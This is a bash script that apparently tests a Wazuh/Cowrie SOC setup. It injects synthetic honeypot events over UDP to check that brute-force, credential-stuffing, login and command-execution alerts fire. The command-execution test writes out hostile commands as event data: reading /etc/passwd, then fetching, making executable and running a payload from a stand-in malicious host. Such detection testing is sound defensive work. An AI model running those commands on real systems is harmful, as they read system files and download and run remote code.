#!/usr/bin/env bash
# Generate synthetic test events to verify detection rules fire correctly
# No honeypot needed — events are injected directly into the SOC stack

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$SCRIPT_DIR"

# Wazuh syslog endpoint (UDP 514 by default)
WAZUH_SYSLOG_HOST="${WAZUH_SYSLOG_HOST:-localhost}"
WAZUH_SYSLOG_PORT="${WAZUH_SYSLOG_PORT:-514}"

echo "==> Generating synthetic detection events"
echo "    Target: $WAZUH_SYSLOG_HOST:$WAZUH_SYSLOG_PORT"
echo

# --- Test 1: SSH brute force ---
echo "[1/4] Generating SSH brute force pattern (alert 100105 should fire)..."

ATTACKER_IP="203.0.113.42"
TARGET_USER="root"

for i in {1..6}; do
  TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")
  EVENT="{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"$ATTACKER_IP\",\"username\":\"$TARGET_USER\",\"password\":\"password$i\",\"timestamp\":\"$TIMESTAMP\",\"session\":\"abc123\",\"sensor\":\"soc-honeypot-1\"}"
  echo "$EVENT" | nc -u -w1 "$WAZUH_SYSLOG_HOST" "$WAZUH_SYSLOG_PORT"
  echo "    [$i/6] Sent failed login from $ATTACKER_IP for user $TARGET_USER"
  sleep 1
done

echo
echo "    Wait 30 seconds, then check Wazuh dashboard for alert 100105"
sleep 30

# --- Test 2: Credential stuffing ---
echo "[2/4] Generating credential stuffing pattern (alert 100106 should fire)..."

CRED_STUFF_IP="198.51.100.99"
USERNAMES=("admin" "root" "ubuntu" "user" "test" "guest" "operator" "support" "info" "service" "default")

for username in "${USERNAMES[@]}"; do
  TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")
  EVENT="{\"eventid\":\"cowrie.login.failed\",\"src_ip\":\"$CRED_STUFF_IP\",\"username\":\"$username\",\"password\":\"password123\",\"timestamp\":\"$TIMESTAMP\",\"session\":\"def456\",\"sensor\":\"soc-honeypot-1\"}"
  echo "$EVENT" | nc -u -w1 "$WAZUH_SYSLOG_HOST" "$WAZUH_SYSLOG_PORT"
  echo "    Sent failed login from $CRED_STUFF_IP for user $username"
  sleep 0.5
done

# --- Test 3: Successful login (anomaly) ---
echo "[3/4] Generating successful login (alert 100102 should fire — high severity)..."

TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")
EVENT="{\"eventid\":\"cowrie.login.success\",\"src_ip\":\"203.0.113.42\",\"username\":\"root\",\"password\":\"123456\",\"timestamp\":\"$TIMESTAMP\",\"session\":\"abc123\",\"sensor\":\"soc-honeypot-1\"}"
echo "$EVENT" | nc -u -w1 "$WAZUH_SYSLOG_HOST" "$WAZUH_SYSLOG_PORT"
echo "    Sent successful login from 203.0.113.42 — should escalate"

# --- Test 4: Command execution after login ---
echo "[4/4] Generating attacker command execution (alert 100103 should fire)..."

COMMANDS=("uname -a" "cat /etc/passwd" "wget http://malicious.example.com/payload" "chmod +x payload" "./payload")

for cmd in "${COMMANDS[@]}"; do
  TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.000Z")
  EVENT="{\"eventid\":\"cowrie.command.input\",\"src_ip\":\"203.0.113.42\",\"input\":\"$cmd\",\"timestamp\":\"$TIMESTAMP\",\"session\":\"abc123\",\"sensor\":\"soc-honeypot-1\"}"
  echo "$EVENT" | nc -u -w1 "$WAZUH_SYSLOG_HOST" "$WAZUH_SYSLOG_PORT"
  echo "    Sent command: $cmd"
  sleep 1
done

echo
echo "==> Test events sent."
echo
echo "Verification:"
echo "  1. Wazuh dashboard:    https://localhost:443"
echo "     Filter alerts by:   rule.id:[100100 TO 100199]"
echo "  2. Kibana:             http://localhost:5601"
echo "     Search: log_source:cowrie AND eventid:*"
echo
echo "Expected alerts:"
echo "  - 100101 — Failed login (multiple times)"
echo "  - 100102 — Successful login (level 10, requires investigation)"
echo "  - 100103 — Command execution (level 8)"
echo "  - 100105 — Brute force aggregate (level 10)"
echo "  - 100106 — Credential stuffing (level 12)"
